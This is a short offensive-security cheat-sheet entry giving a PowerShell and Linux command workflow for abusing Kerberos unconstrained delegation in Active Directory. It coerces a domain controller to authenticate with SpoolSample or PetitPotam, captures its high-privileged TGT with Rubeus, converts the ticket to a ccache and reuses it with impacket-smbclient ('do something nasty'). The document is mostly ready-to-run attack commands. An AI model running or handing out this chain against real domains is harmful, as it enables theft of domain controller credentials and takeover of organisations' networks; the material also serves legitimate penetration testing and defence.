### Example Workflow

```powershell
.\Rubeus.exe monitor /interval:5 /nowrap

SpoolSample.exe dc01.domain.local dc02.child.domain.local

# or use PetitPotam or any other coercion
PetitPotam.py dc02.child.domain.local dc01.domain.local

# Grab TGT blob on DC02 and convert for KAli
rubeustoccache.py $blob dc01.kirbi dc01.ccache

export KRB5CCNAME=dc01.ccache

#do something nasty
impacket-smbclient -k -no-pass dc01.domain.local
```

This can be very different depending on your environment. You may use other coercion techniques. The goal here is to get the high privileged TGT from DC01 with any means. Then capturing the ticket on the compromised host can be done with Rubers, mimikatz or in some cases with krbrelayx.
